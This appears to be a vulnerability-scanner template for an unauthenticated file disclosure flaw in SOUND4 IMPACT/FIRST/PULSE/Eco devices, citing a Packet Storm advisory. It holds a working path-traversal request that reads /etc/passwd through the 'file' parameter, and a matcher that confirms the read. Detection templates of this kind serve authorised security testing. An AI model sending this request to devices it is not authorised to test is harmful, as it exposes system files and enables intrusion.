id: sound4-file-disclosure
name: SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x (PHPTail) Unauthenticated File Disclosure
severity: medium
confidence: confirmed
description: The application suffers from an unauthenticated file disclosure vulnerability. Using the 'file' GET parameter
  attackers can disclose arbitrary files on the affected device and disclose sensitive and system information.
reference: https://packetstormsecurity.com/files/170263/SOUND4-IMPACT-FIRST-PULSE-Eco-2.x-Unauthenticated-File-Disclosure.html
tags:
- packetstorm
- lfi
- sound4
- unauth
- disclosure
- vuln
requests:
- method: GET
  path: /cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
